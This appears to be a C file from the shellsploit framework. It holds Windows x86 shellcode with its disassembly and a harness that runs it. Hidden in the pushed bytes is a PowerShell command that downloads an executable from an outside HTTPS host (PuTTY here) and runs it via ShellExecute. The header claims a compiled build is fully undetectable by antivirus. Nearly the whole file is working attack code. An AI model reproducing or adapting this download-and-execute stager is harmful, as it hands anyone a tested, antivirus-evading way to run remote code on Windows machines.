/*
[+] Author  : B3mB4m
[~] Contact : b3mb4m@protonmail.com
[~] Project : https://github.com/b3mb4m/shellsploit-framework
[~] Greetz  : Bomberman,T-Rex,Pixi
-----------------------------------------------------------

Tested on :
    Windows XP/SP3 x86
    Windows 7 Ultimate x64
    Windows 8.1 Pro Build 9600 x64
    Windows 10 Home x64


* This source belongs to shellsploit project under MIT licence.

* If you convert it an executable file, its will be FUD(without any encrypt).
 	-PoC : https://nodistribute.com/result/qwxU3DmFCR2M0OrQt



	0x0:	31c9			xor ecx, ecx
	0x2:	b957696e45		mov ecx, 0x456e6957
	0x7:	eb04			jmp 0xd
	0x9:	31c9			xor ecx, ecx
	0xb:	eb00			jmp 0xd
	0xd:	31c0			xor eax, eax
	0xf:	31db			xor ebx, ebx
	0x11:	31d2			xor edx, edx
	0x13:	31ff			xor edi, edi
	0x15:	31f6			xor esi, esi
	0x17:	648b7b30		mov edi, dword ptr fs:[ebx + 0x30]
	0x1b:	8b7f0c			mov edi, dword ptr [edi + 0xc]
	0x1e:	8b7f1c			mov edi, dword ptr [edi + 0x1c]
	0x21:	8b4708			mov eax, dword ptr [edi + 8]
	0x24:	8b7720			mov esi, dword ptr [edi + 0x20]
	0x27:	8b3f			mov edi, dword ptr [edi]
	0x29:	807e0c33		cmp byte ptr [esi + 0xc], 0x33
	0x2d:	75f2			jne 0x21
	0x2f:	89c7			mov edi, eax
	0x31:	03783c			add edi, dword ptr [eax + 0x3c]
	0x34:	8b5778			mov edx, dword ptr [edi + 0x78]
	0x37:	01c2			add edx, eax
	0x39:	8b7a20			mov edi, dword ptr [edx + 0x20]
	0x3c:	01c7			add edi, eax
	0x3e:	89dd			mov ebp, ebx
	0x40:	81f957696e45	cmp ecx, 0x456e6957
	0x46:	0f8530010000	jne 0x17c
	0x4c:	8b34af			mov esi, dword ptr [edi + ebp*4]
	0x4f:	01c6			add esi, eax
	0x51:	45				inc ebp
	0x52:	390e			cmp dword ptr [esi], ecx
	0x54:	75f6			jne 0x4c
	0x56:	8b7a24			mov edi, dword ptr [edx + 0x24]
	0x59:	01c7			add edi, eax
	0x5b:	668b2c6f		mov bp, word ptr [edi + ebp*2]
	0x5f:	8b7a1c			mov edi, dword ptr [edx + 0x1c]
	0x62:	01c7			add edi, eax
	0x64:	8b7caffc		mov edi, dword ptr [edi + ebp*4 - 4]
	0x68:	01c7			add edi, eax
	0x6a:	89d9			mov ecx, ebx
	0x6c:	b1ff			mov cl, 0xff
	0x6e:	53				push ebx
	0x6f:	e2fd			loop 0x6e
	0x71:	68293b7d22		push 0x227d3b29
	0x76:	6865786527		push 0x27657865
	0x7b:	687474792e		push 0x2e797474
	0x80:	6828277075		push 0x75702728
	0x85:	6863757465		push 0x65747563
	0x8a:	686c457865		push 0x6578456c
	0x8f:	685368656c		push 0x6c656853
	0x94:	686f6e292e		push 0x2e296e6f
	0x99:	6863617469		push 0x69746163
	0x9e:	6870706c69		push 0x696c7070
	0xa3:	686c6c2e41		push 0x412e6c6c
	0xa8:	6820536865		push 0x65685320
	0xad:	682d636f6d		push 0x6d6f632d
	0xb2:	6865637420		push 0x20746365
	0xb7:	682d4f626a		push 0x6a624f2d
	0xbc:	68284e6577		push 0x77654e28
	0xc1:	682729203b		push 0x3b202927
	0xc6:	682e657865		push 0x6578652e
	0xcb:	6875747479		push 0x79747475
	0xd0:	682c202770		push 0x7027202c
	0xd5:	6865786527		push 0x27657865
	0xda:	687474792e		push 0x2e797474
	0xdf:	68362f7075		push 0x75702f36
	0xe4:	68742f7838		push 0x38782f74
	0xe9:	6861746573		push 0x73657461
	0xee:	6874792f6c		push 0x6c2f7974
	0xf3:	682f707574		push 0x7475702f
	0xf8:	687468616d		push 0x6d616874
	0xfd:	6873677461		push 0x61746773
	0x102:	686c692f7e		push 0x7e2f696c
	0x107:	687274682e		push 0x2e687472
	0x10c:	68652e6561		push 0x61652e65
	0x111:	682f2f7468		push 0x68742f2f
	0x116:	687470733a		push 0x3a737074
	0x11b:	6828276874		push 0x74682728
	0x120:	6846696c65		push 0x656c6946
	0x125:	686c6f6164		push 0x64616f6c
	0x12a:	68446f776e		push 0x6e776f44
	0x12f:	686e74292e		push 0x2e29746e
	0x134:	68436c6965		push 0x65696c43
	0x139:	682e576562		push 0x6265572e
	0x13e:	68204e6574		push 0x74654e20
	0x143:	686a656374		push 0x7463656a
	0x148:	68772d4f62		push 0x624f2d77
	0x14d:	6820284e65		push 0x654e2820
	0x152:	682226207b		push 0x7b202622
	0x157:	68616e6420		push 0x20646e61
	0x15c:	68636f6d6d		push 0x6d6d6f63
	0x161:	686c6c202d		push 0x2d206c6c
	0x166:	6872736865		push 0x65687372
	0x16b:	68706f7765		push 0x65776f70
	0x170:	89e2			mov edx, esp
	0x172:	41				inc ecx
	0x173:	51				push ecx
	0x174:	52				push edx
	0x175:	ffd7			call edi
	0x177:	e88dfeffff		call 9
	0x17c:	8b34af			mov esi, dword ptr [edi + ebp*4]
	0x17f:	01c6			add esi, eax
	0x181:	45				inc ebp
	0x182:	813e45786974	cmp dword ptr [esi], 0x74697845
	0x188:	75f2			jne 0x17c
	0x18a:	817e0450726f63	cmp dword ptr [esi + 4], 0x636f7250
	0x191:	75e9			jne 0x17c
	0x193:	8b7a24			mov edi, dword ptr [edx + 0x24]
	0x196:	01c7			add edi, eax
	0x198:	668b2c6f		mov bp, word ptr [edi + ebp*2]
	0x19c:	8b7a1c			mov edi, dword ptr [edx + 0x1c]
	0x19f:	01c7			add edi, eax
	0x1a1:	8b7caffc		mov edi, dword ptr [edi + ebp*4 - 4]
	0x1a5:	01c7			add edi, eax
	0x1a7:	31c9			xor ecx, ecx
	0x1a9:	51				push ecx
	0x1aa:	ffd7			call edi
*/

#include<stdio.h>

char shellcode[]=\

"\x31\xc9\xb9\x57\x69\x6e\x45\xeb\x04\x31\xc9\xeb\x00\x31\xc0\x31\xdb\x31\xd2\x31\xff\x31\xf6\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x81\xf9\x57\x69\x6e\x45\x0f\x85\x30\x01\x00\x00\x8b\x34\xaf\x01\xc6\x45\x39\x0e\x75\xf6\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x29\x3b\x7d\x22\x68\x65\x78\x65\x27\x68\x74\x74\x79\x2e\x68\x28\x27\x70\x75\x68\x63\x75\x74\x65\x68\x6c\x45\x78\x65\x68\x53\x68\x65\x6c\x68\x6f\x6e\x29\x2e\x68\x63\x61\x74\x69\x68\x70\x70\x6c\x69\x68\x6c\x6c\x2e\x41\x68\x20\x53\x68\x65\x68\x2d\x63\x6f\x6d\x68\x65\x63\x74\x20\x68\x2d\x4f\x62\x6a\x68\x28\x4e\x65\x77\x68\x27\x29\x20\x3b\x68\x2e\x65\x78\x65\x68\x75\x74\x74\x79\x68\x2c\x20\x27\x70\x68\x65\x78\x65\x27\x68\x74\x74\x79\x2e\x68\x36\x2f\x70\x75\x68\x74\x2f\x78\x38\x68\x61\x74\x65\x73\x68\x74\x79\x2f\x6c\x68\x2f\x70\x75\x74\x68\x74\x68\x61\x6d\x68\x73\x67\x74\x61\x68\x6c\x69\x2f\x7e\x68\x72\x74\x68\x2e\x68\x65\x2e\x65\x61\x68\x2f\x2f\x74\x68\x68\x74\x70\x73\x3a\x68\x28\x27\x68\x74\x68\x46\x69\x6c\x65\x68\x6c\x6f\x61\x64\x68\x44\x6f\x77\x6e\x68\x6e\x74\x29\x2e\x68\x43\x6c\x69\x65\x68\x2e\x57\x65\x62\x68\x20\x4e\x65\x74\x68\x6a\x65\x63\x74\x68\x77\x2d\x4f\x62\x68\x20\x28\x4e\x65\x68\x22\x26\x20\x7b\x68\x61\x6e\x64\x20\x68\x63\x6f\x6d\x6d\x68\x6c\x6c\x20\x2d\x68\x72\x73\x68\x65\x68\x70\x6f\x77\x65\x89\xe2\x41\x51\x52\xff\xd7\xe8\x8d\xfe\xff\xff\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x45\x78\x69\x74\x75\xf2\x81\x7e\x04\x50\x72\x6f\x63\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x31\xc9\x51\xff\xd7";

main(){(* (int(*)()) shellcode)();}